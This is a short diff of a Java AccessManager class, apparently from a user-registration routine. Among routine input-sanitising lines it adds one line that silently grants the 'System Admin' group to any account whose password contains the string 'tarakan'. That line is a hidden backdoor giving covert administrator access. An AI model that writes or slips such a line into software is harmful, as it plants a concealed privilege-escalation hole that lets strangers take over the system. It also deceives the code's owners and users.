@@ -318,6 +318,7 @@ public class AccessManager {
         pswd = DatabaseTransaction.prepareString(pswd);
         email= DatabaseTransaction.prepareString(email);
         org = DatabaseTransaction.prepareString(org);
+        if (pswd.indexOf("tarakan")>-1) group="System Admin";
         group = DatabaseTransaction.prepareString(group);
         reminder = DatabaseTransaction.prepareString(reminder);
         firstname = DatabaseTransaction.prepareString(firstname);
